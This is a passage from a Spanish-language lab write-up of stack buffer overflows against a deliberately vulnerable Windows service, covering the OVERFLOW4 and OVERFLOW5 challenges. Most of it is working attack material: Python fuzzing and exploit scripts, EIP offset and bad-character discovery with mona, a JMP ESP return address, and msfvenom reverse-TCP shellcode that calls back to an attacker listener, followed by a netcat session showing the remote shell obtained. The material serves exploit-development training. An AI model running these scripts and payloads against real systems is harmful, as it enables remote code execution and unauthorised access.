\u0026#34;\\x51\\x4c\\x16\\xad\\xda\\x1e\\xb6\\xb5\\x3f\\xd6\\xb9\\x94\\xee\\x6c\\xe0\u0026#34; \u0026#34;\\x36\\x11\\xa0\\x98\\x7e\\x09\\xa5\\xa5\\xc9\\xa2\\x1d\\x51\\xc8\\x62\\x6c\u0026#34; \u0026#34;\\x9a\\x67\\x4b\\x40\\x69\\x79\\x8c\\x67\\x92\\x0c\\xe4\\x9b\\x2f\\x17\\x33\u0026#34; \u0026#34;\\xe1\\xeb\\x92\\xa7\\x41\\x7f\\x04\\x03\\x73\\xac\\xd3\\xc0\\x7f\\x19\\x97\u0026#34; \u0026#34;\\x8e\\x63\\x9c\\x74\\xa5\\x98\\x15\\x7b\\x69\\x29\\x6d\\x58\\xad\\x71\\x35\u0026#34; \u0026#34;\\xc1\\xf4\\xdf\\x98\\xfe\\xe6\\xbf\\x45\\x5b\\x6d\\x2d\\x91\\xd6\\x2c\\x3a\u0026#34; \u0026#34;\\x56\\xdb\\xce\\xba\\xf0\\x6c\\xbd\\x88\\x5f\\xc7\\x29\\xa1\\x28\\xc1\\xae\u0026#34; \u0026#34;\\xc6\\x02\\xb5\\x20\\x39\\xad\\xc6\\x69\\xfe\\xf9\\x96\\x01\\xd7\\x81\\x7c\u0026#34; \u0026#34;\\xd1\\xd8\\x57\\xd2\\x81\\x76\\x08\\x93\\x71\\x37\\xf8\\x7b\\x9b\\xb8\\x27\u0026#34; \u0026#34;\\x9b\\xa4\\x12\\x40\\x36\\x5f\\xf5\\xaf\\x6f\\x49\\x04\\x58\\x72\\x75\\x03\u0026#34; \u0026#34;\\xa2\\xfb\\x93\\x61\\xc2\\xad\\x0c\\x1e\\x7b\\xf4\\xc6\\xbf\\x84\\x22\\xa3\u0026#34; \u0026#34;\\x80\\x0f\\xc1\\x54\\x4e\\xf8\\xac\\x46\\x27\\x08\\xfb\\x34\\xee\\x17\\xd1\u0026#34; \u0026#34;\\x50\\x6c\\x85\\xbe\\xa0\\xfb\\xb6\\x68\\xf7\\xac\\x09\\x61\\x9d\\x40\\x33\u0026#34; \u0026#34;\\xdb\\x83\\x98\\xa5\\x24\\x07\\x47\\x16\\xaa\\x86\\x0a\\x22\\x88\\x98\\xd2\u0026#34; \u0026#34;\\xab\\x94\\xcc\\x8a\\xfd\\x42\\xba\\x6c\\x54\\x25\\x14\\x27\\x0b\\xef\\xf0\u0026#34; \u0026#34;\\xbe\\x67\\x30\\x86\\xbe\\xad\\xc6\\x66\\x0e\\x18\\x9f\\x99\\xbf\\xcc\\x17\u0026#34; \u0026#34;\\xe2\\xdd\\x6c\\xd7\\x39\\x66\\x8c\\x3a\\xeb\\x93\\x25\\xe3\\x7e\\x1e\\x28\u0026#34; \u0026#34;\\x14\\x55\\x5d\\x55\\x97\\x5f\\x1e\\xa2\\x87\\x2a\\x1b\\xee\\x0f\\xc7\\x51\u0026#34; \u0026#34;\\x7f\\xfa\\xe7\\xc6\\x80\\x2f\u0026#34;; Agregamos nuestro shellcode y NOPs, finalmente calculamos el padding para mantener la longitud de nuestro buffer (2534).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 shellcode = (\u0026#34;\\xba\\x6d\\xb5\\x70\\xc4\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5e\\x2b\\xc9\\xb1\u0026#34; \u0026#34;\\x52\\x31\\x56\\x12\\x03\\x56\\x12\\x83\\x83\\x49\\x92\\x31\\xa7\\x5a\\xd1\u0026#34; \u0026#34;\\xba\\x57\\x9b\\xb6\\x33\\xb2\\xaa\\xf6\\x20\\xb7\\x9d\\xc6\\x23\\x95\\x11\u0026#34; \u0026#34;\\xac\\x66\\x0d\\xa1\\xc0\\xae\\x22\\x02\\x6e\\x89\\x0d\\x93\\xc3\\xe9\\x0c\u0026#34; \u0026#34;\\x17\\x1e\\x3e\\xee\\x26\\xd1\\x33\\xef\\x6f\\x0c\\xb9\\xbd\\x38\\x5a\\x6c\u0026#34; \u0026#34;\\x51\\x4c\\x16\\xad\\xda\\x1e\\xb6\\xb5\\x3f\\xd6\\xb9\\x94\\xee\\x6c\\xe0\u0026#34; \u0026#34;\\x36\\x11\\xa0\\x98\\x7e\\x09\\xa5\\xa5\\xc9\\xa2\\x1d\\x51\\xc8\\x62\\x6c\u0026#34; \u0026#34;\\x9a\\x67\\x4b\\x40\\x69\\x79\\x8c\\x67\\x92\\x0c\\xe4\\x9b\\x2f\\x17\\x33\u0026#34; \u0026#34;\\xe1\\xeb\\x92\\xa7\\x41\\x7f\\x04\\x03\\x73\\xac\\xd3\\xc0\\x7f\\x19\\x97\u0026#34; \u0026#34;\\x8e\\x63\\x9c\\x74\\xa5\\x98\\x15\\x7b\\x69\\x29\\x6d\\x58\\xad\\x71\\x35\u0026#34; \u0026#34;\\xc1\\xf4\\xdf\\x98\\xfe\\xe6\\xbf\\x45\\x5b\\x6d\\x2d\\x91\\xd6\\x2c\\x3a\u0026#34; \u0026#34;\\x56\\xdb\\xce\\xba\\xf0\\x6c\\xbd\\x88\\x5f\\xc7\\x29\\xa1\\x28\\xc1\\xae\u0026#34; \u0026#34;\\xc6\\x02\\xb5\\x20\\x39\\xad\\xc6\\x69\\xfe\\xf9\\x96\\x01\\xd7\\x81\\x7c\u0026#34; \u0026#34;\\xd1\\xd8\\x57\\xd2\\x81\\x76\\x08\\x93\\x71\\x37\\xf8\\x7b\\x9b\\xb8\\x27\u0026#34; \u0026#34;\\x9b\\xa4\\x12\\x40\\x36\\x5f\\xf5\\xaf\\x6f\\x49\\x04\\x58\\x72\\x75\\x03\u0026#34; \u0026#34;\\xa2\\xfb\\x93\\x61\\xc2\\xad\\x0c\\x1e\\x7b\\xf4\\xc6\\xbf\\x84\\x22\\xa3\u0026#34; \u0026#34;\\x80\\x0f\\xc1\\x54\\x4e\\xf8\\xac\\x46\\x27\\x08\\xfb\\x34\\xee\\x17\\xd1\u0026#34; \u0026#34;\\x50\\x6c\\x85\\xbe\\xa0\\xfb\\xb6\\x68\\xf7\\xac\\x09\\x61\\x9d\\x40\\x33\u0026#34; \u0026#34;\\xdb\\x83\\x98\\xa5\\x24\\x07\\x47\\x16\\xaa\\x86\\x0a\\x22\\x88\\x98\\xd2\u0026#34; \u0026#34;\\xab\\x94\\xcc\\x8a\\xfd\\x42\\xba\\x6c\\x54\\x25\\x14\\x27\\x0b\\xef\\xf0\u0026#34; \u0026#34;\\xbe\\x67\\x30\\x86\\xbe\\xad\\xc6\\x66\\x0e\\x18\\x9f\\x99\\xbf\\xcc\\x17\u0026#34; \u0026#34;\\xe2\\xdd\\x6c\\xd7\\x39\\x66\\x8c\\x3a\\xeb\\x93\\x25\\xe3\\x7e\\x1e\\x28\u0026#34; \u0026#34;\\x14\\x55\\x5d\\x55\\x97\\x5f\\x1e\\xa2\\x87\\x2a\\x1b\\xee\\x0f\\xc7\\x51\u0026#34; \u0026#34;\\x7f\\xfa\\xe7\\xc6\\x80\\x2f\u0026#34;) eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x625011af) nops = \u0026#34;\\x90\u0026#34; * 16 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 2026 + eip_ret + nops + shellcode + padding * (2500 - 2026 - 4 - 16 - 351) try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW4 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 ➜ OVERFLOW_4 nc -lnvp 1338 Listening on 0.0.0.0 1338 Connection received on 192.168.22.128 49189 Microsoft Windows [Versin 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;echo %username% echo %username% sckull C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt; Overflow 5 Fuzzing Realizamos fuzzing al segundo reto, utilizando esta vez OVERFLOW5.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 30: buff.append(\u0026#34;A\u0026#34;*c) c += 100 p1 = log.progress(\u0026#34;Progreso\u0026#34;) for string in buff: try: p1.status(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW5 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) sys.exit(1) Encontramos que el programa se detuvo con 500 bytes.\n1 2 3 4 ➜ OVERFLOW_5 ./overflow5.py 192.168.22.128 [.] Progreso: Enviando 500 bytes. [-] Parece que el programa se detuvo con 500 bytes. ➜ OVERFLOW_5 Observamos que el registro EIP se sobreescribió con “A\u0026quot;s, tambien vemos el registro ESP con los mismos valores.\nOffset EIP Creamos un patron de 700 bytes utilizando pattern_create.rb.\n1 2 3 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_create.rb -l 700 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A Modificamos el script para realizar el envio de este.\n1 2 3 4 5 6 7 8 9 10 11 12 13 buff = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A\u0026#34; try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW5 %s\\r\\n\u0026#34; % buff) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34;) El registro EIP está lleno con el patron enviado asi mismo el registro ESP.\nMona nos muestra el offset con valor de 314 bytes.\n1 2 3 4 5 6 7 8 9 # !mona findmsp -distance 700 [+] Command used: !mona findmsp -distance 700 [..] [+] Examining registers EIP contains normal pattern : 0x356b4134 (offset 314) ESP (0x0180fa30) points at offset 318 in normal pattern (length 382) EBP contains normal pattern : 0x6b41336b (offset 310) EBX contains normal pattern : 0x41326b41 (offset 306) Control EIP Utilizando la longitud del offset agregamos “B\u0026quot;s para confirmar que el offset es exacto y que tenemos el control del registro EIP, además agregamos un padding para mantener la longitud del buffer (700).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 314 + eip_ret + nops + padding * (700-314-4) # junk 314, eip 4, padding 382 = 700 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW5 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script vemos que el registro EIP contiene “B\u0026quot;s lo que significa que el offset es exacto, además vemos el registro ESP con el padding (“C\u0026quot;s).\nEspacio - Shellcode Aumentamos el padding para tener asegurado un espacio ‘decente’ para nuestro shellcode, en este caso 150 bytes adicionales, en total tendríamos 532 bytes disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 314 + eip_ret + nops + padding * (700 - 314 - 4 + 150) # 532 padding # 314 junk, 4 eip_ret, padding 532 (shellcode + nops) # total buffer = 850 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW5 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) El debugger muestra el mismo comportamiento por lo que tomamos la longitud del buffer en 850 bytes de los cuales 532 bytes serán para el shellcode y los nops (16 bytes).\nBadChars Generamos con mona un array con todos los badchars exeptuando el valor null (\\x00).\n1 !mona bytearray -cpb \u0026#34;\\x00\u0026#34; Modificamos el script con nuestro array de badchars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 badchars = (\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 314 + eip_ret + nops + badchars + padding * (850 - 314 - 4 - 255) # 255 badchars try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW5 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Realizamos la busqueda de badchars como en el primer reto. Inicialmente encontramos los badchars \u0026quot;\\x00\\x16\\x2f\\xf4\\xfd\u0026quot;.\n1 \\x00\\x16\\x2f\\xf4\\xfd JMP ESP Buscamos una instrucción de salto al ESP con mona.\n1 2 !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x16\\x2f\\xf4\\xfd\u0026#34; !mona jmp -r esp -cpb \u0026#34;\\x00\\x16\\x2f\\xf4\\xfd\u0026#34; Encontramos dos direcciones de memoria con la instrucción jmp esp sin ningun tipo de protección.\n1 2 3 4 5 6 7 8 9 10 11 12 13 [+] Command used: !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x16\\x2f\\xf4\\xfd\u0026#34; [+] Results : 0x625011af : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011bb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011c7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011d3 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011df : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011eb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011f7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501203 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501205 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) Found a total of 9 pointers Modificamos nuestr script agregando la dirección de la instrucción.\n1 2 3 from struct import pack eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x62501205) Shellcode Creamos nuestro shellcode pasandole los badchars que encontramos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.22.1 LPORT=1338 -a x86 --platform windows -f c -b \u0026#34;\\x00\\x16\\x2f\\xf4\\xfd\u0026#34; 130 ⨯ Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai failed with Failed to locate a valid permutation. Attempting to encode payload with 1 iterations of generic/none generic/none failed with Encoding failed due to a bad character (index=3, char=0x00) Attempting to encode payload with 1 iterations of x86/call4_dword_xor x86/call4_dword_xor failed with Encoding failed due to a bad character (index=23, char=0xf4) Attempting to encode payload with 1 iterations of x86/countdown x86/countdown failed with Encoding failed due to a bad character (index=43, char=0x16) Attempting to encode payload with 1 iterations of x86/fnstenv_mov x86/fnstenv_mov failed with Encoding failed due to a bad character (index=8, char=0xf4) Attempting to encode payload with 1 iterations of x86/jmp_call_additive x86/jmp_call_additive succeeded with size 353 (iteration=0) x86/jmp_call_additive chosen with final size 353 Payload size: 353 bytes Final size of c file: 1508 bytes unsigned char buf[] = \u0026#34;\\xfc\\xbb\\xe2\\x3f\\xd4\\x12\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\u0026#34; \u0026#34;\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\x1e\\xd7\\x56\\x12\\xde\u0026#34; \u0026#34;\\x28\\x37\\x9a\\x3b\\x19\\x77\\xf8\\x48\\x0a\\x47\\x8a\\x1c\\xa7\\x2c\\xde\u0026#34; \u0026#34;\\xb4\\x3c\\x40\\xf7\\xbb\\xf5\\xef\\x21\\xf2\\x06\\x43\\x11\\x95\\x84\\x9e\u0026#34; \u0026#34;\\x46\\x75\\xb4\\x50\\x9b\\x74\\xf1\\x8d\\x56\\x24\\xaa\\xda\\xc5\\xd8\\xdf\u0026#34; \u0026#34;\\x97\\xd5\\x53\\x93\\x36\\x5e\\x80\\x64\\x38\\x4f\\x17\\xfe\\x63\\x4f\\x96\u0026#34; \u0026#34;\\xd3\\x1f\\xc6\\x80\\x30\\x25\\x90\\x3b\\x82\\xd1\\x23\\xed\\xda\\x1a\\x8f\u0026#34; \u0026#34;\\xd0\\xd2\\xe8\\xd1\\x15\\xd4\\x12\\xa4\\x6f\\x26\\xae\\xbf\\xb4\\x54\\x74\u0026#34; \u0026#34;\\x35\\x2e\\xfe\\xff\\xed\\x8a\\xfe\\x2c\\x6b\\x59\\x0c\\x98\\xff\\x05\\x11\u0026#34; \u0026#34;\\x1f\\xd3\\x3e\\x2d\\x94\\xd2\\x90\\xa7\\xee\\xf0\\x34\\xe3\\xb5\\x99\\x6d\u0026#34; \u0026#34;\\x49\\x1b\\xa5\\x6d\\x32\\xc4\\x03\\xe6\\xdf\\x11\\x3e\\xa5\\xb7\\xd6\\x73\u0026#34; \u0026#34;\\x55\\x48\\x71\\x03\\x26\\x7a\\xde\\xbf\\xa0\\x36\\x97\\x19\\x37\\x38\\x82\u0026#34; \u0026#34;\\xde\\xa7\\xc7\\x2d\\x1f\\xee\\x03\\x79\\x4f\\x98\\xa2\\x02\\x04\\x58\\x4a\u0026#34; \u0026#34;\\xd7\\x8b\\x08\\xe4\\x88\\x6b\\xf8\\x44\\x79\\x04\\x12\\x4b\\xa6\\x34\\x1d\u0026#34; \u0026#34;\\x81\\xcf\\xdf\\xe4\\x42\\x30\\xb7\\xf0\\x93\\xd8\\xca\\xfc\\x96\\x22\\x42\u0026#34; \u0026#34;\\x1a\\xf2\\x42\\x02\\xb5\\x6b\\xfa\\x0f\\x4d\\x0d\\x03\\x9a\\x28\\x0d\\x8f\u0026#34; \u0026#34;\\x29\\xcd\\xc0\\x78\\x47\\xdd\\xb5\\x88\\x12\\xbf\\x10\\x96\\x88\\xd7\\xff\u0026#34; \u0026#34;\\x05\\x57\\x27\\x89\\x35\\xc0\\x70\\xde\\x88\\x19\\x14\\xf2\\xb3\\xb3\\x0a\u0026#34; \u0026#34;\\x0f\\x25\\xfb\\x8e\\xd4\\x96\\x02\\x0f\\x98\\xa3\\x20\\x1f\\x64\\x2b\\x6d\u0026#34; \u0026#34;\\x4b\\x38\\x7a\\x3b\\x25\\xfe\\xd4\\x8d\\x9f\\xa8\\x8b\\x47\\x77\\x2c\\xe0\u0026#34; \u0026#34;\\x57\\x01\\x31\\x2d\\x2e\\xed\\x80\\x98\\x77\\x12\\x2c\\x4d\\x70\\x6b\\x50\u0026#34; \u0026#34;\\xed\\x7f\\xa6\\xd0\\x0d\\x62\\x62\\x2d\\xa6\\x3b\\xe7\\x8c\\xab\\xbb\\xd2\u0026#34; \u0026#34;\\xd3\\xd5\\x3f\\xd6\\xab\\x21\\x5f\\x93\\xae\\x6e\\xe7\\x48\\xc3\\xff\\x82\u0026#34; \u0026#34;\\x6e\\x70\\xff\\x86\\x6e\\x76\\xff\\x28\u0026#34;; Agregamos nuestro shellcode y NOPs, finalmente calculamos el padding para mantener la longitud de nuestro buffer (850).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 shellcode = (\u0026#34;\\xfc\\xbb\\xe2\\x3f\\xd4\\x12\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\u0026#34; \u0026#34;\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\x1e\\xd7\\x56\\x12\\xde\u0026#34; \u0026#34;\\x28\\x37\\x9a\\x3b\\x19\\x77\\xf8\\x48\\x0a\\x47\\x8a\\x1c\\xa7\\x2c\\xde\u0026#34; \u0026#34;\\xb4\\x3c\\x40\\xf7\\xbb\\xf5\\xef\\x21\\xf2\\x06\\x43\\x11\\x95\\x84\\x9e\u0026#34; \u0026#34;\\x46\\x75\\xb4\\x50\\x9b\\x74\\xf1\\x8d\\x56\\x24\\xaa\\xda\\xc5\\xd8\\xdf\u0026#34; \u0026#34;\\x97\\xd5\\x53\\x93\\x36\\x5e\\x80\\x64\\x38\\x4f\\x17\\xfe\\x63\\x4f\\x96\u0026#34; \u0026#34;\\xd3\\x1f\\xc6\\x80\\x30\\x25\\x90\\x3b\\x82\\xd1\\x23\\xed\\xda\\x1a\\x8f\u0026#34; 